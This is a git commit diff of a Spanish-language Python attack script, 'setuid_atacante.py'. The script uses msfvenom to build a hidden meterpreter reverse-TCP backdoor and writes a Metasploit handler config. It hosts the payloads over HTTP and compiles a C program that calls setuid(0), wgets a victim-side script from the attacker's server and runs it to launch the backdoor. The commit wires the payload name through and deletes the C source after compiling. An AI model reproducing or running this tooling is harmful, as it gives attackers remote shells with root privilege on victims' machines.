ff3427dbac866fe16139d79144da32244724f675
AdrianGomezMartin <33320425+AdrianGomezMartin@users.noreply.github.com>
2022-04-25 22:29:08 +0200

    Update setuid_atacante.py

--- setuid_atacante.py
+++ setuid_atacante.py
@@ -4,7 +4,6 @@ try:
 except ImportError as e:
     os.system("pip install colorama")
 
-
 archivo_rc = "setuid_atacante.rc"
 tipo_payload = "linux/x86/meterpreter/reverse_tcp"
 tipo_ejecutable = "elf"
@@ -31,6 +30,7 @@ def crear_backdoor(ip_local, puerto_escucha):
     payload = pedir_dato("INTRODUCE EL NOMBRE DEL PAYLOAD SIN EXTENSION")
     os.system(f"msfvenom -p {tipo_payload} LHOST={ip_local} LPORT={puerto_escucha} -f {tipo_ejecutable} -o .{payload}.{tipo_ejecutable}")
     informar(f"BACKDOOR GENERADO COMO : .{payload}.{tipo_ejecutable}")
+    return payload 
 
 def levantar_servidor():
     os.system("xterm -e sudo python3 -m http.server 80 &")
@@ -43,7 +43,7 @@ def escribir_rc(ordenes_rc):
 
     informar(f"{archivo_rc} GENERADO CON EXITO")
 
-def escribir_archivo(servidor):
+def escribir_archivo(servidor, archivo):
     codigo = """#include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -52,7 +52,7 @@ def escribir_archivo(servidor):
 int main(){
   setuid(0);
   system("wget http://""" + servidor + """/setuid_victima.py");
-  system("python3 setuid_victima.py -r """ + servidor + """ -e .BACKDOOR.elf");
+  system("python3 setuid_victima.py -r """ + servidor + """ -e """ + archivo + """ -x """ + tipo_ejecutable + """ ");
   return 0;
 }
 """
@@ -63,22 +63,23 @@ int main(){
 def lanza_metasploit():
     os.system(f"msfconsole -q -r {archivo_rc}")
 
-def configurar_archivo(ip):
+def configurar_archivo(ip, payload):
     informar("Generando Archivo C ")
-    escribir_archivo(ip)
+    escribir_archivo(ip, payload)
     os.system(f"cat {c}")
     conf = pedir_dato(f"Desea modificar el archivo {c} antes de compilarlo ? [S/n] ")
     if len(conf) == 0 or conf[0].upper() == "S":
         os.system(f"nano {c}")
     informar(f"COMPILANDO {c} a SUID")
     os.system(f"gcc {c} -o SUID")
+    informar(f"Eliminando {c}")
+    os.system(f"rm {c}")
 
 def main():
     interfaz = pedir_dato("INTRODUCE la interfaz conectada a internet")
     ip = obtener_ip_automaticamente(interfaz)
     puerto = pedir_dato("INTRODUCE EL PUERTO A LA ESCUCHA DEL PAYLOAD")
     informar(f"IP DETECTADA :  {ip}")
-    configurar_archivo(ip)
     ordenes_rc = [
     "use exploit/multi/handler",
     f"set PAYLOAD {tipo_payload}",
@@ -88,7 +89,8 @@ def main():
     escribir_rc(ordenes_rc)
     gen = pedir_dato("DESEA CREAR UN PAYLOAD?[S/n]")
     if len(gen) == 0 or gen[0].upper() == "S":
-        crear_backdoor(ip, puerto)
+        payload = crear_backdoor(ip, puerto)
+        configurar_archivo(ip, payload)
         informar("NECESITO PERMISOS PARA LEVANTAR UN SERVIDOR WEB")
         levantar_servidor()
 
